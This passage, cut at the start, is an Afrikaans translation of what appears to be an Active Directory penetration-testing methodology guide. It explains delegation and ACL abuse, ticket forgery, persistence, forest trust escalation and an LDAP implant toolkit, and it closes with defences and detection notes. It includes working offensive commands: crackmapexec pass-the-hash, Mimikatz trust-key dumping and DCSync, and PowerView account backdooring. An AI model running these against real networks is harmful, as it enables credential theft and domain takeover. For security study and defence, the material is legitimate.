crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let daarop dat dit taamlik **lawaaierig** is en **LAPS** dit sou **versag**.

### MSSQL Abuse & Trusted Links

As ’n gebruiker voorregte het om toegang tot **MSSQL instances** te verkry, kan hy dit moontlik gebruik om **commands uit te voer** in die MSSQL-host (indien dit as SA loop), die NetNTLM **hash** te **steel** of selfs ’n **relay**-**attack** uit te voer.\
As ’n MSSQL-instance deur ’n database link deur ’n ander instance vertrou word, kan ’n gebruiker met voorregte oor die gekoppelde database moontlik **die trust relationship gebruik om queries op die ander instance uit te voer**. Hierdie trusts kan geketting word en uiteindelik ’n verkeerd gekonfigureerde database bereik waar die gebruiker commands kan uitvoer.\
**Die links tussen databases werk selfs oor forest trusts heen.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuse of IT asset/deployment platforms

Derdepart inventory- en deployment-suites stel dikwels kragtige paaie na credentials en code execution bloot. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer-object vind met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) en jy domain-voorregte op die computer het, sal jy TGTs uit die memory van elke gebruiker wat by die computer aanmeld, kan dump.\
Dus, as ’n **Domain Admin by die computer aanmeld**, sal jy sy TGT kan dump en hom kan impersonateer met behulp van [Pass the Ticket](pass-the-ticket.md).\
Danksy constrained delegation kan jy selfs **outomaties ’n Print Server kompromitteer** (hopelik sal dit ’n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As ’n gebruiker of computer toegelaat word vir "Constrained Delegation", sal dit **enige gebruiker kan impersonateer om toegang tot sekere services op ’n computer te verkry**.\
As jy dan die **hash van hierdie gebruiker/computer kompromitteer**, sal jy **enige gebruiker** (selfs domain admins) kan impersonateer om toegang tot sekere services te verkry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Die besit van **WRITE**-voorregte op ’n Active Directory-object van ’n remote computer maak die verkryging van code execution met **verhoogde voorregte** moontlik:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuse of Permissions/ACLs

Die gekompromitteerde gebruiker kan sekere **interessante voorregte oor sommige domain objects** hê wat jou lateraal kan laat **beweeg**/**voorregte laat eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuse of Printer Spooler service

As jy ’n **Spool service ontdek wat binne die domain luister**, kan dit **misbruik** word om **nuwe credentials te bekom** en **voorregte te eskaleer**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuse of third-party sessions

As **ander gebruikers** toegang tot die **gekompromitteerde** machine verkry, is dit moontlik om **credentials uit memory te versamel** en selfs **beacons in hul prosesse te inject** om hulle te impersonateer.\
Gebruikers sal gewoonlik via RDP toegang tot die system verkry, so hier is hoe om ’n paar attacks op third-party RDP-sessions uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** verskaf ’n system vir die bestuur van die **local Administrator password** op domain-joined computers, en verseker dat dit **gerandomiseer**, uniek en gereeld **verander** word. Hierdie passwords word in Active Directory gestoor en toegang word deur ACLs tot slegs gemagtigde gebruikers beheer. Met voldoende voorregte om toegang tot hierdie passwords te verkry, word pivoting na ander computers moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Die versameling van certificates** vanaf die gekompromitteerde machine kan ’n manier wees om voorregte binne die environment te eskaleer:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuse of Certificate Templates

As **kwesbare templates** gekonfigureer is, is dit moontlik om hulle te misbruik om voorregte te eskaleer:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sodra jy **Domain Admin**- of, nog beter, **Enterprise Admin**-voorregte verkry, kan jy die **domain database**: _ntds.dit_ **dump**.

[**Meer inligting oor die DCSync attack kan hier gevind word**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steel, kan hier gevind word**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke wat voorheen bespreek is, kan vir persistence gebruik word.\
Jy kan byvoorbeeld:

- Gebruikers kwesbaar maak vir [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Gebruikers kwesbaar maak vir [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- [**DCSync**](#dcsync)-voorregte aan ’n gebruiker toestaan

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep ’n **legitimate Ticket Granting Service (TGS) ticket** vir ’n spesifieke service deur die **NTLM hash** (byvoorbeeld die **hash van die PC-account**) te gebruik. Hierdie metode word gebruik om **toegang tot die service se voorregte te verkry**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

’n **Golden Ticket attack** behels dat ’n aanvaller toegang verkry tot die **NTLM hash van die krbtgt-account** in ’n Active Directory (AD)-environment. Hierdie account is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te onderteken, wat noodsaaklik is vir authentication binne die AD-network.

Sodra die aanvaller hierdie hash verkry, kan hy **TGTs** vir enige account van sy keuse skep (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Dit is soos golden tickets wat op ’n manier vervals is wat **algemene golden tickets detection mechanisms omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Die besit van certificates van ’n account of die vermoë om dit aan te vra** is ’n baie goeie manier om persistence in die gebruiker se account te handhaaf (selfs indien hy die password verander):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Dit is ook moontlik om certificates te gebruik om persistence met hoë voorregte binne die domain te handhaaf:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-object in Active Directory verseker die sekuriteit van **bevoorregte groepe** (soos Domain Admins en Enterprise Admins) deur ’n standaard **Access Control List (ACL)** op hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter uitgebuit word; as ’n aanvaller die AdminSDHolder se ACL wysig om volle toegang aan ’n gewone gebruiker te gee, verkry daardie gebruiker uitgebreide beheer oor alle bevoorregte groepe. Hierdie sekuriteitsmaatreël, wat bedoel is om te beskerm, kan dus terugvuur en ongemagtigde toegang moontlik maak indien dit nie noukeurig gemonitor word nie.

[**Meer inligting oor AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Binne elke **Domain Controller (DC)** bestaan daar ’n **local administrator**-account. Deur admin-regte op so ’n machine te verkry, kan die local Administrator-hash met **mimikatz** onttrek word. Daarna is ’n registry-wysiging nodig om **die gebruik van hierdie password te enable**, wat remote access tot die local Administrator-account moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan aan ’n **user** sekere **spesiale permissions** oor spesifieke domain objects **gee**, wat die gebruiker in staat sal stel om **in die toekoms voorregte te eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissions** te **stoor** wat ’n **object** oor ’n ander **object** **het**. As jy net ’n **klein verandering** in die **security descriptor** van ’n object kan **maak**, kan jy baie interessante voorregte oor daardie object verkry sonder dat jy lid van ’n bevoorregte groep hoef te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Misbruik die `dynamicObject`-auxiliary class om kortlewende principals/GPOs/DNS-records met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle skrap hulself sonder tombstones, vee LDAP-bewyse uit terwyl orphan SIDs, gebroke `gPLink`-verwysings of gekasjelde DNS-responses agterbly (byvoorbeeld AdminSDHolder ACE-pollution of kwaadwillige `gPCFileSysPath`/AD-geïntegreerde DNS-redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in memory om ’n **universele password** daar te stel, wat toegang tot alle domain-accounts verleen.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Leer hier wat ’n SSP (Security Support Provider) is.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om die **credentials** wat gebruik word om toegang tot die machine te verkry, in **clear text** te **capture**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer ’n **nuwe Domain Controller** in die AD en gebruik dit om **attributes** (SIDHistory, SPNs...) op gespesifiseerde objects te **push** sonder om enige **logs** oor die **modifications** agter te laat. Jy **benodig DA**-voorregte en moet binne die **root domain** wees.\
Let daarop dat indien jy verkeerde data gebruik, baie lelike logs sal verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ons het voorheen bespreek hoe om voorregte te eskaleer indien jy **genoeg permissions het om LAPS-passwords te lees**. Hierdie passwords kan egter ook gebruik word om **persistence te handhaaf**.\
Sien:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft beskou die **Forest** as die sekuriteitsgrens. Dit impliseer dat **die kompromittering van ’n enkele domain moontlik tot die kompromittering van die hele Forest kan lei**.<sup>[[1]](#references)</sup>

### Basic Information

’n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is ’n sekuriteitsmeganisme wat ’n gebruiker van een **domain** in staat stel om toegang tot resources in ’n ander **domain** te verkry. Dit skep in wese ’n koppeling tussen die authentication-stelsels van die twee domains, wat authentication-verifikasies toelaat om naatloos te vloei. Wanneer domains ’n trust opstel, ruil hulle spesifieke **keys** binne hul **Domain Controllers (DCs)** uit en behou dit; hierdie keys is noodsaaklik vir die integriteit van die trust.

In ’n tipiese scenario moet ’n gebruiker wat toegang tot ’n service in ’n **trusted domain** wil verkry, eers ’n spesiale ticket, bekend as ’n **inter-realm TGT**, van sy eie domain se DC aanvra. Hierdie TGT word geënkripteer met ’n gedeelde **key** waaroor beide domains ooreengekom het. Die gebruiker bied dan hierdie TGT aan die **DC van die trusted domain** om ’n service ticket (**TGS**) te verkry. Nadat die trusted domain se DC die inter-realm TGT suksesvol valideer, reik dit ’n TGS uit wat die gebruiker toegang tot die service verleen.

**Stappe**:

1. ’n **client computer** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om ’n **Ticket Granting Ticket (TGT)** van sy **Domain Controller (DC1)** aan te vra.
2. DC1 reik ’n nuwe TGT uit indien die client suksesvol ge-authenticateer is.
3. Die client vra dan ’n **inter-realm TGT** van DC1 aan, wat nodig is om toegang tot resources in **Domain 2** te verkry.
4. Die inter-realm TGT word geënkripteer met ’n **trust key** wat tussen DC1 en DC2 gedeel word as deel van die tweerigting-domain trust.
5. Die client neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met behulp van sy gedeelde trust key en reik, indien dit geldig is, ’n **Ticket Granting Service (TGS)** uit vir die server in Domain 2 waartoe die client toegang wil verkry.
7. Laastens bied die client hierdie TGS aan die server, wat met die server se account-hash geënkripteer is, om toegang tot die service in Domain 2 te verkry.

### Different trusts

Dit is belangrik om daarop te let dat **’n trust 1-rigting of 2-rigting kan wees**. In die 2-rigting-opsie sal beide domains mekaar vertrou, maar in die **1-rigting**-trustverhouding sal een van die domains die **trusted** en die ander die **trusting** domain wees. In laasgenoemde geval sal **jy slegs toegang tot resources binne die trusting domain vanaf die trusted domain kan verkry**.

As Domain A Domain B vertrou, is A die trusting domain en B die trusted one. Verder sal dit in **Domain A** ’n **Outbound trust** wees; en in **Domain B** ’n **Inbound trust**.

**Verskillende trusting relationships**

- **Parent-Child Trusts**: Dit is ’n algemene opstelling binne dieselfde forest, waar ’n child domain outomaties ’n tweerigting-transitiewe trust met sy parent domain het. Dit beteken in wese dat authentication requests naatloos tussen die parent en child kan vloei.
- **Cross-link Trusts**: Ook bekend as "shortcut trusts"; dit word tussen child domains gevestig om referral-prosesse te bespoedig. In komplekse forests moet authentication referrals gewoonlik opgaan na die forest root en dan afgaan na die teikendomain. Deur cross-links te skep, word die roete verkort, wat veral voordelig is in geografies verspreide environments.
- **External Trusts**: Dit word tussen verskillende, onverwante domains opgestel en is van nature nie-transitief nie. Volgens [Microsoft se documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig vir toegang tot resources in ’n domain buite die huidige forest wat nie deur ’n forest trust gekoppel is nie. Sekuriteit word deur SID filtering met external trusts versterk.
- **Tree-root Trusts**: Hierdie trusts word outomaties tussen die forest root domain en ’n nuut bygevoegde tree root gevestig. Alhoewel dit nie algemeen voorkom nie, is tree-root trusts belangrik vir die toevoeging van nuwe domain trees tot ’n forest, sodat hulle ’n unieke domain name kan behou en tweerigting-transitiwiteit verseker. Meer inligting kan in [Microsoft se guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) gevind word.
- **Forest Trusts**: Hierdie tipe trust is ’n tweerigting-transitiewe trust tussen twee forest root domains, en pas ook SID filtering toe om sekuriteitsmaatreëls te versterk.
- **MIT Trusts**: Hierdie trusts word gevestig met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-domains. MIT trusts is meer gespesialiseerd en is gerig op environments wat integrasie met Kerberos-gebaseerde systems buite die Windows-ekosisteem vereis.

#### Ander verskille in **trusting relationships**

- ’n Trust relationship kan ook **transitief** wees (A trust B, B trust C, dan trust A C) of **nie-transitief**.
- ’n Trust relationship kan as ’n **bidirectional trust** (beide vertrou mekaar) of as ’n **one-way trust** (slegs een van hulle vertrou die ander) opgestel word.

### Attack Path

1. **Enumerate** die trusting relationships
2. Kontroleer of enige **security principal** (user/group/computer) **access** tot resources van die **ander domain** het, moontlik deur ACE-inskrywings of deur lid van groepe in die ander domain te wees. Soek na **relationships across domains** (die trust is waarskynlik hiervoor geskep).
1. kerberoast kan in hierdie geval ’n ander opsie wees.
3. **Kompromitteer** die **accounts** wat deur domains kan **pivot**.

Aanvallers met toegang tot resources in ’n ander domain kan dit deur drie primêre meganismes verkry:

- **Local Group Membership**: Principals kan by local groups op machines gevoeg word, soos die “Administrators”-groep op ’n server, wat aan hulle beduidende beheer oor daardie machine verleen.
- **Foreign Domain Group Membership**: Principals kan ook lede van groepe binne die foreign domain wees. Die doeltreffendheid van hierdie metode hang egter af van die aard van die trust en die omvang van die groep.
- **Access Control Lists (ACLs)**: Principals kan in ’n **ACL** gespesifiseer word, veral as entiteite in **ACEs** binne ’n **DACL**, wat hulle toegang tot spesifieke resources verleen. Vir diegene wat dieper in die werking van ACLs, DACLs en ACEs wil delf, is die whitepaper getiteld “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ’n waardevolle resource.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** nagaan om foreign security principals in die domain te vind. Dit sal user/group uit **’n external domain/forest** wees.

Jy kan dit in **Bloodhound** nagaan of powerview gebruik:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domeintrusts te enumerate:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 trusted keys**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domain gebruik word, met die volgende kry:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin na die child/parent domain deur die trust met SID-History injection te misbruik:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Dit is van kardinale belang om te verstaan hoe die Configuration Naming Context (NC) uitgebuit kan word. Die Configuration NC dien as ’n sentrale bewaarplek vir konfigurasiedata oor ’n forest in Active Directory (AD)-omgewings. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, met writable DCs wat ’n writable kopie van die Configuration NC behou. Om dit uit te buit, moet ’n mens **SYSTEM privileges on a DC** hê, verkieslik ’n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites-container bevat inligting oor al die domain-joined computers se sites binne die AD-forest. Deur met SYSTEM privileges op enige DC te werk, kan aanvallers GPOs aan die root DC-sites koppel. Hierdie handeling kan die root domain kompromitteer deur policies wat op hierdie sites toegepas word, te manipuleer.

Vir in-diepte inligting kan ’n mens navorsing oor [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) ondersoek.<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Een aanvalvektor behels die teiken van bevoorregte gMSAs binne die domain. Die KDS Root key, wat noodsaaklik is vir die berekening van gMSAs se passwords, word binne die Configuration NC gestoor. Met SYSTEM privileges op enige DC is dit moontlik om toegang tot die KDS Root key te verkry en die passwords vir enige gMSA oor die hele forest te bereken.

Gedetailleerde ontleding en stap-vir-stap leiding kan gevind word in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende gedelegeerde MSA-aanval (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Bykomende external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Hierdie metode vereis geduld, terwyl daar gewag word vir die skepping van nuwe bevoorregte AD-objects. Met SYSTEM privileges kan ’n aanvaller die AD Schema wysig om enige user volledige beheer oor alle classes te gee. Dit kan lei tot ongemagtigde toegang tot en beheer oor nuutgeskepte AD-objects.

Verdere leeswerk is beskikbaar oor [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-kwesbaarheid teiken beheer oor Public Key Infrastructure (PKI)-objects om ’n certificate template te skep wat authentication as enige user binne die forest moontlik maak. Aangesien PKI-objects in die Configuration NC voorkom, maak die kompromittering van ’n writable child DC die uitvoering van ESC5 attacks moontlik.

Meer besonderhede kan gelees word in [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> In scenario’s sonder ADCS het die aanvaller die vermoë om die nodige components op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario word **jou domain vertrou** deur ’n eksterne een wat jou **onbepaalde permissions** daaroor gee. Jy sal moet vasstel **watter principals van jou domain watter access oor die eksterne domain het** en dit dan probeer uitbuit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest Domain - Eenrigting (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario **vertrou jou domein** sekere **privileges** aan ’n principal van **verskillende domeine** toe.

Wanneer ’n **domein deur** die vertrouende domein **vertrou word**, skep die vertroude domein egter ’n **user** met ’n **voorspelbare naam** wat die **trusted password** as wagwoord gebruik. Dit beteken dat dit moontlik is om **toegang tot ’n user van die vertrouende domein te verkry om die vertroude domein binne te gaan**, dit te enumeriseer en te probeer om nog **privileges** te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog ’n manier om die vertroude domein te kompromitteer, is om ’n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domain trust geskep is (wat nie baie algemeen is nie).

Nog ’n manier om die vertroude domein te kompromitteer, is om op ’n masjien te wag waar ’n **user van die vertroude domein toegang het** om via **RDP** aan te meld. Die aanvaller kan dan code in die RDP-sessieproses inject en van daar af **toegang tot die slagoffer se oorspronklike domein verkry**.\
Verder, indien die **slagoffer sy hardeskyf gemount het**, kan die aanvaller vanuit die **RDP-sessieproses** **backdoors** in die **startup folder van die hardeskyf** stoor. Hierdie tegniek staan as **RDPInception** bekend.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Versagting van domain trust abuse

### **SID Filtering:**

- Die risiko van attacks wat die SID history-attribute oor forest trusts heen gebruik, word deur SID Filtering versag, wat by verstek op alle inter-forest trusts geaktiveer is. Dit berus op die aanname dat intra-forest trusts veilig is, aangesien die forest, eerder as die domain, volgens Microsoft se standpunt as die security boundary beskou word.
- Daar is egter ’n probleem: SID filtering kan applications en user access ontwrig, wat daartoe lei dat dit soms gedeaktiveer word.

### **Selective Authentication:**

- Vir inter-forest trusts verseker die gebruik van Selective Authentication dat users van die twee forests nie outomaties geauthentiseer word nie. In plaas daarvan word eksplisiete permissions vereis vir users om toegang tot domains en servers binne die trusting domain of forest te verkry.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerm teen die exploitation van die writable Configuration Naming Context (NC) of attacks op die trust account nie.

[**Meer inligting oor domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-style LDAP primitives as x64 Beacon Object Files wat volledig binne ’n on-host implant (bv. Adaptix C2) loop. Operateurs compileer die pack met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon aan. Alle traffic gebruik die huidige logon security context oor LDAP (389) met signing/sealing of LDAPS (636) met outomatiese certificate trust, sodat geen socks proxies of disk artifacts benodig word nie.<sup>[[4]](#references)</sup>

### LDAP enumeration aan die implant-kant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` en `get-groupmembers` resolve short names/OU paths na volledige DNs en dump die ooreenstemmende objects.
- `get-object`, `get-attribute` en `get-domaininfo` haal arbitrary attributes (insluitend security descriptors) plus die forest/domain metadata vanaf `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` en `get-rbcd` wys roasting candidates, delegation settings en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-descriptors direk vanaf LDAP.
- `get-acl` en `get-writable --detailed` parse die DACL om trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) en inheritance te lys, wat onmiddellike targets vir ACL privilege escalation bied.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-skryfprimitiewe vir eskalasie & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operator nuwe principals of machine accounts voorberei waar ook al OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` kaap teikens direk sodra write-property-regte gevind word.
- ACL-gefokusde commands soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` omskep WriteDACL/WriteOwner op enige AD-object in password resets, group membership-beheer, of DCSync-replikasievoorregte sonder om PowerShell/ADSI-artifacts agter te laat. `remove-*`-ekwivalente verwyder ingevoegde ACEs.

### Delegation, roasting, en Kerberos abuse

- `add-spn`/`set-spn` maak ’n gekompromitteerde user onmiddellik Kerberoastable; `add-asreproastable` (UAC-toggle) merk dit vir AS-REP roasting sonder om aan die password te raak.
- Delegation-makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC-flags, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD attack paths moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory-injectie, OU-verskuiwing, en aanvaloppervlakvorming

- `add-sidhistory` inject privileged SIDs in ’n beheerde principal se SID history (sien [SID-History Injection](sid-history-injection.md)), wat stealthy access inheritance volledig oor LDAP/LDAPS verskaf.
- `move-object` verander die DN/OU van computers of users, sodat ’n aanvaller assets kan verskuif na OUs waar delegated rights reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Noukeurig afgebakende removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) maak vinnige rollback moontlik nadat die operator credentials of persistence verkry het, wat telemetry minimaliseer.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Leer meer oor hoe om credentials hier te beskerm.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins-beperkings**: Dit word aanbeveel dat Domain Admins slegs toegelaat word om by Domain Controllers aan te meld, en dat die gebruik daarvan op ander hosts vermy word.
- **Service Account-voorregte**: Services moenie met Domain Admin (DA)-voorregte uitgevoer word nie, om security te handhaaf.
- **Temporal Privilege Limitation**: Vir take wat DA-voorregte vereis, moet die duur daarvan beperk word. Dit kan bereik word met: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay-mitigering**: Oudit Event IDs 2889/3074/3075 en forceer daarna LDAP signing plus LDAPS channel binding op DCs/clients om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

As jy algemene AD tradecraft wil opspoor, **moenie slegs op operator-beheerde artifacts staatmaak nie**, soos hernoemde binaries, service names, temp batch files, of output paths. Stel ’n baseline op van hoe wettige Windows-clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, en WMI-verkeer opbou, en soek dan na **implementation quirks** wat voortbestaan selfs nadat die operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, of `ntlmrelayx.py` gewysig het.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidates** (nadat dit teen jou eie baseline gevalideer is):
- Geauthentiseerde DCE/RPC met `auth_context_id = 79231 + ctx_id`
- DCE/RPC-authentication padding gevul met `0xff`
- LDAP Kerberos-binds wat ’n rou Kerberos `AP-REQ` direk in SPNEGO `mechToken` plaas
- SMB2/3-negotiate requests met ASCII-agtige `ClientGuid`-waardes
- WMI `IWbemLevel1Login::NTLMLogin` wat die nie-standaard namespace `//./root/cimv2` gebruik
- Hardcoded Kerberos nonce-waardes
- **Better as correlation/scoring features**:
- Sparse of gedupliseerde Kerberos-etype-lyste, ongewone/ontbrekende `PA-DATA`, of TGS-REQ-etype-ordering wat van native Windows verskil
- NTLM Type 1-boodskappe sonder version info of Type 3-boodskappe met null host names
- Rou NTLMSSP wat in DCE/RPC gedra word in plaas van SPNEGO, ontbrekende DCE/RPC-verification trailers, of SPNEGO/Kerberos OID-mismatches
- Verskeie van hierdie traits vanaf dieselfde host/user/session/time window is baie sterker as enige enkele swak field
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, en tool-specific HTTP/WebDAV/RDP/MSSQL-strings
- Dit is maklik vir operators om te verander en word die beste gebruik om te verduidelik waarom ’n cross-protocol cluster verdag is
- **Operational notes**:
- Sommige van hierdie signals vereis decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, of service-side visibility
- Valideer teen Samba/Linux-clients, appliances, en legacy software voordat dit tot alerts bevorder word
